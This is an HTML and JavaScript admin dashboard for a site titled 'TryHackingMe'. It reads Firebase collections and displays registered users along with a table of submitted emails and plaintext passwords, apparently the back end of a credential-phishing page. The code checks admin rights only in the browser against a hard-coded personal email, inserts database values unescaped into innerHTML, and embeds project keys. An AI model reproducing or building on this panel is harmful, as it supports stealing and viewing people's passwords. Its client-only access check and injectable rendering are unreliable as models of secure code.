<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Admin Panel - TryHackingMe</title>
<style>
body{margin:0;font-family:'Orbitron',sans-serif;background:#121212;color:#fff;padding:20px;}
h1{color:#ce93d8;}
table{width:100%;border-collapse:collapse;margin-top:20px;}
th,td{padding:12px;border-bottom:1px solid #444;text-align:left;}
th{background:#8e24aa;}
tr:hover{background:#333;}
.logout{margin-top:20px;padding:10px 20px;background:#8e24aa;border:none;color:#fff;cursor:pointer;}
.logout:hover{background:#6a1b9a;}
</style>
</head>
<body>
<h1>Admin Panel</h1>
<h2>Registered Users</h2>
<table>
  <thead>
    <tr>
      <th>Email</th>
      <th>Last Online</th>
      <th>Signup Date</th>
    </tr>
  </thead>
  <tbody id="userList">
    <tr><td colspan="3">Loading...</td></tr>
  </tbody>
</table>

<h2>User Submitted Information</h2>
<table>
  <thead>
    <tr>
      <th>Email</th>
      <th>Password</th>
      <th>Submitted At</th>
    </tr>
  </thead>
  <tbody id="submissionList">
    <tr><td colspan="3">Loading...</td></tr>
  </tbody>
</table>

<button class="logout" onclick="logout()">Logout</button>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyAmSC92mozosP8JdQGOzF7KE9wCa-h4b_E",
  authDomain: "authdomain-b606b.firebaseapp.com",
  projectId: "authdomain-b606b",
  storageBucket: "authdomain-b606b.firebasestorage.app",
  messagingSenderId: "374508656476",
  appId: "1:374508656476:web:1a1affe311734602bc5399",
  measurementId: "G-FH5BSP31E7"
};
if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

// Redirect if not logged in or not admin
auth.onAuthStateChanged(user=>{
  if(!user || user.email !== "abdullahyt4622@gmail.com") window.location.href="index.html";
  else loadUsers();
});

// Logout
function logout(){ auth.signOut().then(()=> window.location.href="index.html"); }

// Load registered users
function loadUsers(){
  db.collection("users").orderBy("createdAt","desc").get().then(snapshot=>{
    const tbody = document.getElementById("userList");
    tbody.innerHTML = "";
    if(snapshot.empty) tbody.innerHTML="<tr><td colspan='3'>No users found</td></tr>";
    snapshot.forEach(doc=>{
      const data = doc.data();
      const created = data.createdAt ? data.createdAt.toDate().toLocaleString() : "N/A";
      const lastOnline = data.lastOnline ? data.lastOnline.toDate().toLocaleString() : "N/A";
      tbody.innerHTML += `<tr><td>${data.email}</td><td>${lastOnline}</td><td>${created}</td></tr>`;
    });
  });

  db.collection("submissions").orderBy("submittedAt","desc").get().then(snapshot=>{
    const tbody = document.getElementById("submissionList");
    tbody.innerHTML = "";
    if(snapshot.empty) tbody.innerHTML="<tr><td colspan='3'>No submissions found</td></tr>";
    snapshot.forEach(doc=>{
      const data = doc.data();
      const submitted = data.submittedAt ? data.submittedAt.toDate().toLocaleString() : "N/A";
      tbody.innerHTML += `<tr><td>${data.email}</td><td>${data.password}</td><td>${submitted}</td></tr>`;
    });
  });
}
</script>
</body>
</html>
